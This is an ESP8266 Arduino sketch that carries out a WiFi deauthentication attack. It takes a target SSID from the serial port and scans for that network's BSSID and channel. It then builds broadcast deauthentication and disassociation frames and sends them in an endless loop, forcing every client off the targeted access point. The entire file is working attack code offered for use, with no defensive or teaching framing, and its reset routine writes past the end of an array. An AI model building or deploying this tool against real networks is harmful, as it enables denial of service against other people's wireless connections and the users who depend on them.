#include <ESP8266WiFi.h>

extern "C" {
#include "user_interface.h"
}

#define NUMNET 50
#define MAC_ADDR_LEN 6
#define PACKET_SIZE 26

uint8_t numNetworks = 0;        // number of networks found
uint8_t* knownBSSIDS[NUMNET];   // all known networks found
bool found;                     // if target network is found

uint8_t targetBSSID[MAC_ADDR_LEN];  // target network BSSID
uint8_t targetChannel = 1;          // target network channel
String  targetSSID;                 // target network SSID

uint8_t deauthPacket[PACKET_SIZE] = {
  /*0 - 1*/  0x00, 0x00, // Frame Control -> Packet type
  /*2 - 3*/  0x00, 0x00, // Duration
  /*4 - 9*/  0xff, 0xff, 0xff, 0xff, 0xff, 0xff, // Destination (broadcast) (all 0xff means to everyone instead of a specific device)
  /*10 - 15*/  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source (AP MAC)
  /*16 - 21*/  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID (AP MAC)
  /*22 - 23*/  0x00, 0x00, // Fragment & Sequence number
  /*24 - 25*/  0x01, 0x00  // Reason code 1 (no reason given)
};

void setup() {
  Serial.begin(115200);
  Serial.println("");

  found = false;  
  getTargetSSID(); // first get chosen SSID
  delay(100);
}

// initializes target SSID from Serial port
void getTargetSSID(){
  Serial.println("Enter target wifi SSID:");
  while (!Serial.available()){}
  targetSSID = Serial.readStringUntil('\n');
  Serial.printf("Deauthing %s\n", targetSSID.c_str());
}

void loop() {
  // find target's BSSID, then deauth attack

  if(!found){
    findNewNetworks();
  }else{
    deauthAttack();
  }
  delay(10);
}

// void deauthAttack() {
void deauthAttack() {
  WiFi.mode(WIFI_STA); // set wifi modes
  wifi_promiscuous_enable(1);

  Serial.println("Deauthing...");
  wifi_set_channel(targetChannel);
  
  // initialize deauth packet with target's BSSID
  uint8_t deauthPkt[PACKET_SIZE];
  memcpy(deauthPkt, deauthPacket, PACKET_SIZE);
  memcpy(&deauthPkt[10], targetBSSID, MAC_ADDR_LEN);
  memcpy(&deauthPkt[16], targetBSSID, MAC_ADDR_LEN);
  deauthPkt[0] = 0xc0; // change packet type to Deauthenticate

  // initialize disassociate packet from deauth packet
  uint8_t disassociatePkt[PACKET_SIZE];
  memcpy(disassociatePkt, deauthPkt, PACKET_SIZE);
  disassociatePkt[0] = 0xa0; // change packet type to Disassociate

  //send both packets
  while (true){
    sendPacket(deauthPkt, PACKET_SIZE, "Deauth\0");
    delay(5);
    sendPacket(disassociatePkt, PACKET_SIZE, "Disassociate\0");
    delay(5);
  }
}

// generic function to handle packet sending
bool sendPacket(uint8_t* packet, uint8_t pktSize, char* pktType){
    int result = wifi_send_pkt_freedom(packet, pktSize, 0);

    if(result != 0){
      //Serial.printf("%s PACKET FAILED: %d\n", pktType, result);
    }else{
      //Serial.printf("%s PACKET SENT: %d\n", pktType, result);
    }
    return result == 0;
}

//reset all fields
void restart(){
  for(uint8_t i = 0 ; i < numNetworks; i++){
    free(knownBSSIDS[i]);
  }
  numNetworks = 0;
  found = false;

  targetBSSID[MAC_ADDR_LEN] = {0};
  targetChannel = 1;
  targetSSID = "";

  Serial.println("Memory Resetted.");
}

// discover all nearby networks
void findNewNetworks(){
  Serial.println("Trying to find target...");
  uint8_t foundNetworks = WiFi.scanNetworks();

  // loop all found networks
  for (uint8_t i = 0; i < foundNetworks; i++){
    
    bool isNewNetwork = true;

    // check if any found networks have been seen before
    for (uint8_t k = 0; k < numNetworks; k++){
      if(memcmp(WiFi.BSSID(i), knownBSSIDS[k], MAC_ADDR_LEN) == 0){
        isNewNetwork = false;
        break;
      }
    }

    // new network has not seen before, add to list of known networks
    if(isNewNetwork){
      if (numNetworks < NUMNET) {
        knownBSSIDS[numNetworks] = (uint8_t*)malloc(sizeof(uint8_t)*MAC_ADDR_LEN);
        memcpy(knownBSSIDS[numNetworks], WiFi.BSSID(i), MAC_ADDR_LEN);
        numNetworks++;

      }else{// restart if known network array is full
        printf("All network slots filled. Restarting");
        restart();
        return;

      }

      Serial.println("\nNew Network found");
      Serial.printf("SSID   : %s\n", WiFi.SSID(i).c_str());
      Serial.printf("BSSID  : %s\n", WiFi.BSSIDstr(i).c_str());
      Serial.printf("Channel: %d\n", WiFi.channel(i));

      //new network is the chosen target
      if(WiFi.SSID(i) == targetSSID){
        Serial.printf("%s FOUND\n", targetSSID.c_str());

        found = true;
        memcpy(targetBSSID, WiFi.BSSID(i), MAC_ADDR_LEN);
        targetChannel = WiFi.channel(i);
        break;
      }
    }
  }
}